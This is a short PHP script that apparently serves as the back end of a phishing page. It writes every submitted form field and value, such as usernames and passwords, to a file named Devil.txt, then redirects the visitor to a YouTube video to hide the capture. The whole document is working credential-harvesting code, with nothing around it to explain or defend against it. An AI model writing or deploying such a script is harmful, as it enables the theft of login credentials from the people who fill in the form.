<?php
header ('Location: https://www.youtube.com/watch?v=6lvO1C-8z9o ');
$handle = fopen("Devil.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, ":");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>